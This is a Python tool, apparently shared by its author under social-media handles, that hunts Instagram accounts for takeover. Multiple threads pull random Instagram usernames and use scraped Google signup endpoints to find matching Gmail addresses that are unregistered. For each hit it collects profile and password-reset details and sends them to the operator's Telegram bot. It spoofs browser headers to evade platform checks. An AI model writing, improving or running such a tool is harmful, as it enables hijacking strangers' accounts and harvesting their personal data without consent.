import os
try:
  from user_agent import generate_user_agent
  import random
  import requests
  from threading import Thread
  from time import sleep as zzz
  from faker import Faker
  import re
  from ms4 import InfoIG
  from ms4 import Instagram
  from ms4 import RestInsta
  from ms4 import UserAgentGenerator
except:
	os.system("pip install faker")
	os.system("pip install ms4==2.10.0")

import re		
from user_agent import generate_user_agent
import random
import requests
from threading import Thread
from time import sleep as zzz
from faker import Faker
from ms4 import InfoIG
from ms4 import Instagram
from ms4 import RestInsta
from ms4 import UserAgentGenerator
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
memo = random.randint(100, 300)
O = f'\x1b[38;5;{memo}m'

print(f'''{B}{E}=============================={B}
|{F}[+] YouTube    : {B}| أحمد الحراني 
|{F}[+] TeleGram   : {B} maho_s9    
|{F}[+] Instagram  : {B} ahmedalharrani 
|{F}[+] Tool       : {B} VIP SERVICE IG V2 MAX|
{E}==============================''')

token = input(f' {F}({M}1{F}) {M} Enter Token{F}  ' + O)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({M}2{F}) {M} Enter ID{F}  ' + O)

def Tele(email):
    user = email.split("@")[0]
    try:
        rest = RestInsta.Rest(user)["email"]
    except:
        rest = "Nothing To Rest"

    inf = InfoIG.Instagram_Info(user)
    name = inf["Name"]
    Id = inf["ID"]
    fols = inf["Followers"]
    folg = inf["Following"]
    bio = inf["Bio"]
    po = inf["Posts"]
    pr = inf["Is Private"]

    tlg = f'''
⋘─────━*AHMED*━─────⋙
[💌] Email ==> {email}
[💬] Email Rest ==> {rest}
[👻] Username ==> @{user}
[👱🏻] Name ==> {name}
[🔺] ID ==> {Id}
[🔁] Followers ==> {fols}
[🔂] Following ==> {folg}
[📺] Bio ==> {bio}
[🎥] Posts ==> {po}
[📲] Is Private ==> {pr}
[↩️] URL ==> https://www.instagram.com/{user}
⋘─────━❤️🌚━─────⋙
𝐁𝐘 : @maho_s9 
'''
    print(F+tlg)
    requests.get('https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+ID+'&text='+tlg)

    with open('hits.txt', 'a') as f:
        f.write(tlg + '\n')

def Ch(email):
    IG = Instagram.CheckInsta(email)['Is_Available']
    if IG == 'true':
        print(f"{F}Good Email Hunt Insta : {email}")
        Tele(email)
    elif IG == 'false':
        print(f"{E}Bad Email : {email}")
    else:
        print("Turn VPN")
        zzz(10)
        

def getTl():
    try:
        n1 = ''.join(random.choice("azertyuiopmlkjhgfdsqwxcvbn") for i in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice("azertyuiopmlkjhgfdsqwxcvbn") for i in range(random.randrange(3, 9)))
        host = ''.join(random.choice("azertyuiopmlkjhgfdsqwxcvbn") for i in range(random.randrange(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-YE,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-arch": "\"\"",
            "sec-ch-ua-bitness": "\"\"",
            "sec-ch-ua-full-version": "\"116.0.5845.72\"",
            "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-model": "\"ANY-LX2\"",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua-platform-version": "\"13.0.0\"",
            "sec-ch-ua-wow64": "?0",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
            "x-client-data": "CJjbygE=",
            "x-same-domain": "1",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            'user-agent': str(generate_user_agent()),
        }

        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
            'user-agent': generate_user_agent(),
        }
        data = {
            'f.req': '["' + tok + '","' + n1 + '","' + n2 + '","' + n1 + '","' + n2 + '",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        try:
            os.remove('tlcok.txt')
        except:
            pass
        with open('tlcok.txt', 'a') as f:
            f.write(tl + '|' + host + '\n')
    except Exception as e:
        print(e)
        getTl()


def CheckGmail(email):    
    try:
        with open("tlcok.txt", "r") as f:
            for line in f:
                tl = line.strip().split('|')[0]
                host = line.strip().split('|')[1]
    except:
        getTl()
        with open("tlcok.txt", "r") as f:
            for line in f:
                tl = line.strip().split('|')[0]
                host = line.strip().split('|')[1]
    nono = email.split('@')[0]
    cookies = {'__Host-GAPS': host}
    headers = {
        'authority': 'accounts.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'google-accounts-xsrf': '1',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + tl,
        'user-agent': generate_user_agent(),  
    }
    params = {'TL': tl}
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A' + tl + '%22%2C%22' + nono + '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = requests.post(
        'https://accounts.google.com/_/signup/usernameavailability',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
    
    if '"gf.uar",1' in str(response.text):
        Ch(email)
    elif '"gf.uar",2' in str(response.text) or '"gf.uar",3' in str(response.text):
        print(f"{E}Bad Email : {email}")
    else:
        print(f"{E}Bad Email : {email}")
        getTl()
        CheckGmail(email)
       



def Men():
    while True:
        try:
            faker = Faker()
            NEHAHHH = faker.user_name()  
            lsd = ''.join(random.choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
            id = str(random.randrange(10000, 7407225345))
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/0s9s/',
                'user-agent': str(UserAgentGenerator()),
                'x-fb-lsd': 'mahos' + lsd,
            }
            data = {
                'lsd': 'mahos' + lsd,
                'variables': '{"id":"' + id + '","relay_header":false,"render_surface":"PROFILE"}',
                'doc_id': '7397388303713986',
            }
            NN = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()
            Fuck = NN['data']['user']['username']
        except:
            Fuck = NEHAHHH
            pass
            HH = ''.join(random.choice('zxvcbnmlkjhgfdsapoiuyrtewq') for i in range(6))                      
            name = random.choice([HH, NEHAHHH, Fuck])
            email = name + "@gmail.com"            
            CheckGmail(email)

for i in range(5):
    Thread(target=Men).start()
